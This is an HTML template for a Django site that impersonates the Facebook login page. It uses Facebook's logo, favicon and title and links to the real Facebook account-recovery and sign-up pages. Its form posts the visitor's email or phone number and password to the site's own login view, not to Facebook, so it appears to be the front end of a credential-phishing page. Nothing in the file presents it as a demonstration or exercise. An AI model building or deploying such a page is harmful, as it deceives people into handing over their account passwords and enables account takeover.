<!doctype html>
<html lang="en">
  <head>
    {% load static %}
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <!--My Css-->
    <link rel="stylesheet" href="{% static 'style.css' %}">

    <!--Icon-->
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">

    <!--Title-->
    <title>Log in to Facebook</title>

  </head>
  <body>

  <div class="container" align="center">

    <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">

    <div class="card text-center">
      <div class="card-body">
        <h5 class="card-title">Log in to Facebook</h5>
        <form method="post" action="{% url 'login' %}">
          {% csrf_token %}
          <div class="form-group form-control-lg">
              <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email address or phone number" name="email">
            </div>
            <div class="form-group form-control-lg">
              <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name="password">
            </div>
          <input type="submit" value="Log In" class="btn btn-primary">
          <!--<a type="submit" class="btn btn-primary">Log In</a>-->
        </form>
        <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login" class="_97w4" target="" waprocessedanchor="true">Forgotten account?</a>
          <div class="row">
            <div class="col-5"><hr></div>
            <div class="_1rf5 col-2"><span class="_1rf8">or</span></div>
            <div class="col-5"><hr></div>
          </div>
        <a href="https://www.facebook.com/r.php?locale=en_GB&display=page" class="btn btn-success">Create New Account</a>
      </div>
    </div>

  </div>


    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>
